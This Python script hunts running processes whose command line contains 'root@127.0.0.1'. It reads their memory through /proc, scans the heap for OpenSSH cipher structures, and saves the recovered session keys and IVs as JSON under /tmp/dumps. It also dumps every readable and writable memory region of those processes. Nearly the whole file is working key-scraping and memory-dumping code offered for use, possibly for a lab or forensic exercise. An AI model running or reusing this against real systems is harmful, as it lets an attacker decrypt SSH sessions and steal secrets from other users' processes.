import time
import os
import sys
import re
import ctypes
import json
import inspect
import traceback
from ctypes import Structure, c_uint, c_int, sizeof, c_void_p

# --- extracted from keys.py ---

OPENSSH_ENC_ALGS = {
    #Name, block size, key size
    ("chacha20-poly1305@openssh.com", 8, 64,),
    ("des", 8, 8),
    ("3des", 8, 16),
    ("blowfish", 8, 32),
    ("blowfish-cbc", 8, 16),
    ("cast128-cbc", 8, 16),
    ("arcfour", 8, 16),
    ("arcfour128", 8, 16),
    ("arcfour256", 8, 32),
    ("acss@openssh.org", 16, 5),
    ("3des-cbc", 8, 24),
    ("aes128-cbc", 16, 16,),
    ("aes192-cbc", 16, 24,),
    ("aes256-cbc", 16, 32,),
    ("rijndael-cbc@lysator.liu.se", 16, 32,),
    ("aes128-ctr", 16, 16,),
    ("aes192-ctr", 16, 24,),
    ("aes256-ctr", 16, 32,),
    ("aes128-gcm@openssh.com", 16, 16,),
    ("aes256-gcm@openssh.com", 16, 32,),
}
OPENSSH_ENC_ALGS_LOOKUP = {}

for alg in OPENSSH_ENC_ALGS:
    OPENSSH_ENC_ALGS_LOOKUP[alg[0]] = alg

class BaseStruct(ctypes.Structure):
    def __str__(self):
        values = []
        for field in self._fields_:
            name = field[0]
            val = getattr(self, name)            
            if isinstance(val, (str, )):
                val = repr(val)
            if isinstance(val, (int, )):
                val = hex(val)
            values.append("{}={}".format(name, val))
        return "<{} {}>".format(self.__class__.__name__, " ".join(values))

    def getdict(self):
        return dict((field, getattr(self, field)) for field, _ in self._fields_)

class sshcipher(BaseStruct):
    _fields_ = [
        ("name", ctypes.c_void_p),
    ]

class sshenc_61p1(BaseStruct):  
    _fields_ = [
        ("name", ctypes.c_void_p),
        ("cipher", ctypes.c_void_p),
        ("enabled", ctypes.c_int),
        ("key_len", ctypes.c_uint),
        ("block_size", ctypes.c_uint),
        ("key", ctypes.c_void_p),
        ("iv", ctypes.c_void_p),
    ]

class sshenc_62p1(BaseStruct):  
    _fields_ = [
        ("name", ctypes.c_void_p),
        ("cipher", ctypes.c_void_p),
        ("enabled", ctypes.c_int),
        ("key_len", ctypes.c_uint),
        ("iv_len", ctypes.c_uint),
        ("block_size", ctypes.c_uint),
        ("key", ctypes.c_void_p),
        ("iv", ctypes.c_void_p),
    ]

class ScrapedKey(object):
    def __init__(self, pid, proc_name, sshenc, addr):
        self.pid = pid
        self.proc_name = proc_name
        self.sshenc_addr = addr
        self.cipher_name = None
        self.key = None
        self.iv = None
        self.sshenc = sshenc

    def serialize(self, obj):
        if isinstance(obj, BaseStruct):
            return obj.getdict()
        return obj

    def as_json(self):
        d = dict(self.__dict__)
        # Remove raw struct objects from serialization if needed or handle them
        d['sshenc'] = self.sshenc.getdict()
        return json.dumps(d, default=self.serialize)

class MemoryRegion(object):
    def __init__(self, start, end, permissions, path):
        self.start = start
        self.end = end
        self.permissions = permissions
        self.path = path

class ProcessMemReader:
    def __init__(self, pid):
        self.pid = pid
        self.mem_path = f"/proc/{pid}/mem"
        self.mem_file = None
        self.open_mem()

    def open_mem(self):
        try:
            self.mem_file = open(self.mem_path, 'rb', 0)
        except Exception as e:
            print(f"[-] Could not open {self.mem_path}: {e}")
            self.mem_file = None

    def close(self):
        if self.mem_file:
            self.mem_file.close()
            self.mem_file = None

    def read_bytes(self, addr, size):
        if not self.mem_file:
            return None
        try:
            self.mem_file.seek(addr)
            return self.mem_file.read(size)
        except Exception:
            return None

    def read_struct(self, addr, struct_cls):
        data = self.read_bytes(addr, sizeof(struct_cls))
        if data and len(data) == sizeof(struct_cls):
            return struct_cls.from_buffer_copy(data)
        return None

    def read_string(self, ptr, length=64):
        # Reads a C string up to length
        data = self.read_bytes(ptr, length)
        if not data:
            return None
        try:
            end = data.find(b'\0')
            if end != -1:
                return data[:end].decode('utf-8', errors='ignore')
            return data.decode('utf-8', errors='ignore')
        except:
            return None

class SSHKeyExtractor(object):
    def __init__(self, pid):
        self.pid = pid
        self.reader = ProcessMemReader(pid)
        self.heap_map_info = None
        self.mem_maps = []
        self._load_maps()

    def _load_maps(self):
        try:
            with open(f"/proc/{self.pid}/maps", 'r') as f:
                for line in f:
                    # format: 00400000-0040b000 r-xp ...
                    parts = line.split()
                    range_parts = parts[0].split('-')
                    start = int(range_parts[0], 16)
                    end = int(range_parts[1], 16)
                    perms = parts[1]
                    path = parts[-1] if len(parts) > 5 else ""
                    
                    region = MemoryRegion(start, end, perms, path)
                    self.mem_maps.append(region)
                    
                    if path == "[heap]":
                        self.heap_map_info = region
        except Exception as e:
            print(f"[-] Error loading maps: {e}")

    def is_valid_ptr(self, ptr, allow_nullptr=True, heap_only=True):
        if (ptr == 0 or ptr is None):
            return allow_nullptr

        if heap_only and self.heap_map_info:
            return ptr >= self.heap_map_info.start and ptr < self.heap_map_info.end
        
        # If heap not found or heap_only=False, check all maps
        for mem_map in self.mem_maps:
            if ptr >= mem_map.start and ptr < mem_map.end:
                return True
        return False

    def lookup_enc(self, name):
        return OPENSSH_ENC_ALGS_LOOKUP.get(name, None)

    def probe_sshenc_block(self, ptr, sshenc_size):
        mem = self.reader.read_bytes(ptr, sshenc_size)
        if not mem or len(mem) != sshenc_size:
            return None
        
        # Try larger struct first (62p1)
        enc = sshenc_62p1.from_buffer_copy(mem)
        sshenc_name = self.is_valid_ptr(enc.name, allow_nullptr=False, heap_only=False) # Name usually in .rodata or heap
        sshenc_cipher = self.is_valid_ptr(enc.cipher, allow_nullptr=False, heap_only=False)

        if not (sshenc_name and sshenc_cipher):
            return None

        name_str = self.reader.read_string(enc.name, 64)
        if not name_str: 
            return None

        enc_properties = self.lookup_enc(name_str)
        if not enc_properties:
            return None        

        expected_key_len = enc_properties[2]
        if expected_key_len != enc.key_len:
            return None
                
        cipher = self.reader.read_struct(enc.cipher, sshcipher)
        if not cipher:
            return None
        
        if not self.is_valid_ptr(cipher.name, allow_nullptr=False, heap_only=False):
            return None

        cipher_name = self.reader.read_string(cipher.name, 64)
        if cipher_name != name_str:
            return None        

        # Identify struct version based on block size
        expected_block_size = enc_properties[1]
        
        final_enc = enc
        if expected_block_size != enc.block_size:
            # Try 61p1
            enc_old = sshenc_61p1.from_buffer_copy(mem)
            if expected_block_size == enc_old.block_size:
                final_enc = enc_old
            else:
                return None

        sshenc_key = self.is_valid_ptr(final_enc.key, allow_nullptr=False)
        sshenc_iv = self.is_valid_ptr(final_enc.iv, allow_nullptr=False)
        if sshenc_iv and sshenc_key:
            return final_enc
        return None    

    def construct_scraped_key(self, ptr, enc):
        key = ScrapedKey(self.pid, "ssh", enc, ptr)
        key.cipher_name = self.reader.read_string(enc.name, 64)
        
        key_raw = self.reader.read_bytes(enc.key, enc.key_len)
        key.key = key_raw.hex() if key_raw else "ERROR"
        
        if isinstance(enc, sshenc_61p1):
            iv_len = enc.block_size
        else:
            iv_len = enc.iv_len
            
        iv_raw = self.reader.read_bytes(enc.iv, iv_len)
        key.iv = iv_raw.hex() if iv_raw else "ERROR"
        
        return key

    def align_size(self, size, multiple):
        add = multiple - (size % multiple)
        return size + add

    def extract(self):
        ret = []
        if not self.heap_map_info:
            print("[-] Heap not found, cannot extract keys.")
            return ret

        ptr = self.heap_map_info.start
        sshenc_size = max(sizeof(sshenc_61p1), sizeof(sshenc_62p1))
        
        print(f"[*] Scanning heap from 0x{ptr:x} to 0x{self.heap_map_info.end:x} ({self.heap_map_info.end - ptr} bytes)")
        
        # Optimization: Read heap in chunks instead of tiny reads
        while ptr + sshenc_size < self.heap_map_info.end:
            sshenc = self.probe_sshenc_block(ptr, sshenc_size)
            if sshenc:
                print(f"[+] Found candidate at 0x{ptr:x}")
                key = self.construct_scraped_key(ptr, sshenc)
                ret.append(key)
                ptr += self.align_size(sshenc_size, 4)
            else:
                ptr += 4 # 32-bit alignment
                # ptr += 8 # 64-bit alignment might be safer but 4 covers both
        
        self.reader.close()
        return ret

# --- watcher logic ---

# The target command line we are hunting for
TARGET_CMD = "root@127.0.0.1"
# Where to save the dumps
DUMP_DIR = "/tmp/dumps"
os.makedirs(DUMP_DIR, exist_ok=True)

print(f"[*] Watcher started. Polling for '{TARGET_CMD}'...")
print(f"[*] Dumps will be saved to {DUMP_DIR}")

# Keep track of PIDs we have already processed so we don't dump the same one forever
processed_pids = set()

def extract_keys(pid):
    print(f"[*] Attempting to extract session keys for PID {pid}...")
    try:
        extractor = SSHKeyExtractor(pid)
        keys = extractor.extract()
        if keys:
            key_file = os.path.join(DUMP_DIR, f"found_keys_{pid}.json")
            with open(key_file, 'w') as f:
                for k in keys:
                    f.write(k.as_json() + "\n")
            print(f"[+] Keys extracted and saved to {key_file}")
        else:
            print("[-] No keys found in heap.")
    except Exception as e:
        print(f"[-] extraction failed: {e}")
        traceback.print_exc()

def dump_memory(pid):
    print(f"\n[!] MATCH FOUND! PID: {pid}")
    
    # Trigger key extraction FIRST while process is definitely alive
    extract_keys(pid)
    
    output_file = os.path.join(DUMP_DIR, f"mem_dump_{pid}.bin")
    
    try:
        maps_path = f"/proc/{pid}/maps"
        mem_path = f"/proc/{pid}/mem"
        
        if not os.path.exists(maps_path) or not os.path.exists(mem_path):
            print("[-] Process vanished before dump could start.")
            return

        print(f"[*] Dumping immediate memory snapshot to {output_file}...")
        
        with open(maps_path, 'r') as maps, open(mem_path, 'rb', 0) as mem, open(output_file, 'wb') as out:
            bytes_dumped = 0
            for line in maps:
                # We want readable/writable memory (Heap, Stack, Anonymous)
                if "rw-p" not in line:
                    continue
                
                parts = line.split()
                range_str = parts[0]
                start = int(range_str.split('-')[0], 16)
                end = int(range_str.split('-')[1], 16)
                size = end - start
                
                # Safety cap: skip huge maps (video/shared libs) > 100MB
                if size > 100 * 1024 * 1024:
                    continue

                try:
                    mem.seek(start)
                    chunk = mem.read(size)
                    out.write(chunk)
                    bytes_dumped += size
                except Exception:
                    continue
        
        print(f"[+] SUCCESS. Dumped {bytes_dumped / 1024 / 1024:.2f} MB.")
        
    except Exception as e:
        print(f"[-] Failed during dump: {e}")

while True:
    try:
        # Iterate over all PIDs in /proc
        pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
        
        for pid in pids:
            if pid in processed_pids:
                continue

            try:
                # Read cmdline specifically for this PID
                # We use specific paths to avoid spawning new processes
                with open(f"/proc/{pid}/cmdline", 'rb') as f:
                    cmdline = f.read().decode('utf-8', errors='ignore').replace('\0', ' ')
                    
                if TARGET_CMD in cmdline:
                    # FIRE!
                    dump_memory(pid)
                    processed_pids.add(pid)
                    
            except (IOError, ProcessLookupError):
                # Process died while we were looking at it
                continue
                
    except Exception as e:
        print(f"[!] Main loop error: {e}")
    
    # Sleep briefly to prevent 100% CPU usage, but stay fast
    time.sleep(0.1)


